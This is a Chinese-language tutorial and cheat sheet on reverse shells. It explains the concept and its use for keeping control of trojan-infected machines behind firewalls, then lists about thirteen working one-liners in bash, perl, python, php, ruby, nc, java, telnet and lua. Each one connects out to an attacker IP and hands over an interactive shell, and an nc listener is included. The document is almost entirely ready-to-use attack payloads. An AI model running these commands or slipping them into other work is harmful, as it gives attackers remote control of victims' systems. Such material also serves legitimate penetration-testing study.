##### 什么是反弹shell？

反弹shell，就是控制端监听在某个tcp/udp端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。

##### 为什么需要反弹shell

1. 某客户机中了你的马，但是它在内网中，你不能直接对其进行连接
2. 客户机的IP是动态的会发生变化的，不能持续控制
3. 由于防火墙等限制，对方机器只能发送请求，不能接受请求
4. 对于病毒，木马，受害者什么时候中招，对方所处的网络环境是什么样的，什么时候开关机等情况都是未知的，所以需要建立一个服务端让而已程序主动连接

##### 反弹shell的一些前置知识

| 描述符                | 作用                                                         |
| --------------------- | ------------------------------------------------------------ |
| < 或 <<               | 标准输入，代码为0                                            |
| > 或 >>               | 标准输入出，代码为1                                          |
| 2> 或 2>>             | 标准错误输出，代码为2                                        |
| /dev/tcp[udp]/ip/port | Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，读写这个文件就相当于在这个socket连接中传输数据 |
| &>                    | &>跟2>&1是一个意思都是将标准错误输出合并到标准输出中         |



##### 反弹shell示例

被空端A: 192.168.10.112

```bash
bash -i >& /dev/tcp/192.168.7.108/8433
```

Note: -i 的意思是启动一个交互式的shell

控制端B: 192.168.7.108

```bash
nc -lvvp 8433
```



##### 反弹shell各种姿势

1. bash

```bash
bash -i >& /dev/tcp/192.168.7.101/8099
```

2. perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

3. perl不依赖/bin/sh

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"123.123.123.123:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

4. perl windows环境

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.123:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

5. Python2

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

6. php

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

7. ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

8. ruby windows环境

```ruby
ruby -rsocket -e 'c=TCPSocket.new("123.123.123.123","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

9. ruby不依赖sh

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("123.123.123.123","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

10. NC

```bash
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

11. java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tc
p/10.0.0.1/2002;cat <&5 | while read line; do
 \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

12. NC不可用或者/dev/tcp不可用时

```bash
mknod backpipe p && telnet 123.133.133.133 8080 0<backpipe | /bin/bash 1>backpipe
```

13. lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```



##### 参考链接

[反弹shell原理与实现](https://zhuanlan.zhihu.com/p/138393396)

[反弹SHELL介绍及原理](https://cloud.tencent.com/developer/article/1785076)

[反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488)

[Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549#toc-0)

[Linux渗透之反弹Shell命令解析](https://www.anquanke.com/post/id/85712)

[Reverse Shell Cheat Sheet](https://www.lintstar.top/tools/Reverse-shell.html)

[反弹shell的各种姿势](https://www.cnblogs.com/xiaozi/p/13493010.html)



---

that's all
